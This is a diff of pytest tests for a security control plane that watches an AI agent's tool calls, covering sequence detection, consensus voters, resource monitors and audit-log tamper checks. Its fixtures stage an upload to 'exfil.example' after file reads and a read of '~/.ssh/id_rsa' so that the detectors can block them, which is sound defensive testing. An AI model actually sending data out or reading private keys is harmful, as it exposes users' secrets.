@@ -16,11 +16,13 @@ from shisad.core.events import (
     ProxyRequestEvaluated,
 )
 from shisad.core.providers.base import Message, ProviderResponse
+from shisad.security.control_plane.audit import ControlPlaneAuditLog
 from shisad.security.control_plane.consensus import (
     ActionMonitorVoter,
     ConsensusInput,
     ConsensusPolicy,
     ConsensusVotingSystem,
+    ResourceVoter,
     VoteKind,
     VoterDecision,
 )
@@ -37,6 +39,8 @@ from shisad.security.control_plane.schema import (
     Origin,
     RiskTier,
     build_action,
+    contains_freeform_text,
+    extract_request_size_bytes,
     infer_action_kind,
     sanitize_metadata_payload,
 )
@@ -69,6 +73,38 @@ def test_m5_t1_sequence_detects_fs_read_then_egress() -> None:
         origin=origin,
     )
     history.append_action(read_action, decision_status="allow")
+    candidate = build_action(
+        tool_name="http_request",
+        arguments={"url": "https://exfil.example/upload"},
+        origin=origin,
+        risk_tier=RiskTier.HIGH,
+    )
+
+    findings = analyzer.analyze(history=history, candidate_action=candidate)
+    assert any(item.pattern_name == "exfil_after_read" for item in findings)
+
+
+def test_m5_rt1_sequence_detects_fs_read_then_egress_with_intervening_action() -> None:
+    history = SessionActionHistoryStore()
+    analyzer = BehavioralSequenceAnalyzer()
+    origin = _origin("s1-rt1")
+
+    history.append_action(
+        build_action(
+            tool_name="file.read",
+            arguments={"path": "README.md"},
+            origin=origin,
+        ),
+        decision_status="allow",
+    )
+    history.append_action(
+        build_action(
+            tool_name="file.read",
+            arguments={"path": "docs/PLAN.md"},
+            origin=origin,
+        ),
+        decision_status="allow",
+    )
     candidate = build_action(
         tool_name="http_request",
         arguments={"url": "https://exfil.example/upload"},
@@ -387,6 +423,65 @@ async def test_m5_t11_consensus_veto_works_for_high_risk() -> None:
     assert any(code.startswith("consensus:veto:") for code in decision.reason_codes)
 
 
+@pytest.mark.asyncio
+async def test_m5_rt2_resource_voter_blocks_high_risk_sensitive_access() -> None:
+    history = SessionActionHistoryStore()
+    monitor = ResourceAccessMonitor()
+    voter = ResourceVoter(monitor=monitor, history=history)
+    action = build_action(
+        tool_name="file.read",
+        arguments={"path": "~/.ssh/id_rsa"},
+        origin=_origin("s-rt2"),
+        risk_tier=RiskTier.HIGH,
+    )
+    decision = await voter.cast_vote(
+        ConsensusInput(
+            action=action,
+            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
+        )
+    )
+    assert decision.decision == VoteKind.BLOCK
+    assert decision.risk_tier == RiskTier.HIGH
+
+
+class _SleepVoter:
+    def __init__(self, voter: str, delay_seconds: float) -> None:
+        self._voter = voter
+        self._delay_seconds = delay_seconds
+
+    async def cast_vote(self, data: ConsensusInput) -> VoterDecision:
+        _ = data
+        await asyncio.sleep(self._delay_seconds)
+        return VoterDecision(
+            voter=self._voter,
+            decision=VoteKind.ALLOW,
+            risk_tier=RiskTier.LOW,
+            reason_codes=["allow"],
+        )
+
+
+@pytest.mark.asyncio
+async def test_m5_rt3_consensus_runs_voters_in_parallel() -> None:
+    action = build_action(
+        tool_name="file.read",
+        arguments={"path": "README.md"},
+        origin=_origin("s-rt3"),
+    )
+    data = ConsensusInput(
+        action=action,
+        trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
+    )
+    system = ConsensusVotingSystem(
+        voters=[_SleepVoter(f"v{i}", 0.05) for i in range(5)],
+        policy=ConsensusPolicy(required_approvals_low=5, voter_timeout_seconds=0.5),
+    )
+    start = asyncio.get_running_loop().time()
+    decision = await system.evaluate(data)
+    elapsed = asyncio.get_running_loop().time() - start
+    assert decision.decision.value == "allow"
+    assert elapsed < 0.18
+
+
 def test_m5_t15_action_normalization_maps_aliases_to_canonical_kind() -> None:
     assert infer_action_kind("file_read", {"path": "README.md"}) == ActionKind.FS_READ
     assert infer_action_kind(
@@ -524,3 +619,72 @@ async def test_m5_t20_action_monitor_voter_rejects_raw_text_payloads() -> None:
     )
     assert decision.decision == VoteKind.BLOCK
     assert decision.risk_tier == RiskTier.CRITICAL
+
+
+def test_m5_rt4_contains_freeform_text_blocks_large_single_line_values() -> None:
+    assert contains_freeform_text({"note": "a" * 257}) is True
+    assert contains_freeform_text({"note": "a" * 256}) is False
+
+
+def test_m5_rt5_extract_request_size_is_metadata_only() -> None:
+    assert extract_request_size_bytes({"request_body": "x" * 4096}) == 0
+    assert (
+        extract_request_size_bytes(
+            {"request_body": "x" * 4096, "request_headers": {"Content-Length": "42"}}
+        )
+        == 42
+    )
+
+
+def test_m5_rt6_baseline_known_hosts_handles_colons_in_origin_fields() -> None:
+    baseline = BaselineDatabase()
+    origin = Origin(
+        session_id="s-rt6",
+        user_id="user:alpha",
+        workspace_id="ws:beta",
+        skill_name="skill:gamma",
+        actor="planner",
+    )
+    metadata = extract_network_metadata(
+        origin=origin,
+        tool_name="http_request",
+        destination_host="api.good.example",
+        destination_port=443,
+        protocol="https",
+        request_size=128,
+    )
+    baseline.record(
+        metadata=metadata,
+        allow_or_confirmed=True,
+        suspicious=False,
+        lockdown=False,
+    )
+    assert baseline.known_hosts_for_origin(origin) == {"api.good.example"}
+
+
+def test_m5_rt7_control_plane_audit_chain_detects_whitespace_tamper(tmp_path) -> None:
+    path = tmp_path / "control-plane-audit.jsonl"
+    log = ControlPlaneAuditLog(path)
+    log.append(event_type="e1", session_id="s", actor="a", data={"k": "v1"})
+    log.append(event_type="e2", session_id="s", actor="a", data={"k": "v2"})
+    ok_before, _, _ = log.verify_chain()
+    assert ok_before is True
+
+    lines = path.read_text(encoding="utf-8").splitlines()
+    lines[0] = lines[0] + "  "
+    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+    ok_after, _, error = log.verify_chain()
+    assert ok_after is False
+    assert "chain break" in error
+
+
+def test_m5_rt8_history_load_logs_malformed_records(
+    tmp_path,
+    caplog: pytest.LogCaptureFixture,
+) -> None:
+    history_path = tmp_path / "history.jsonl"
+    history_path.write_text("{not-json}\n", encoding="utf-8")
+    caplog.set_level("WARNING", logger="shisad.security.control_plane.history")
+    _ = SessionActionHistoryStore(history_path)
+    assert "skipping malformed record" in caplog.text
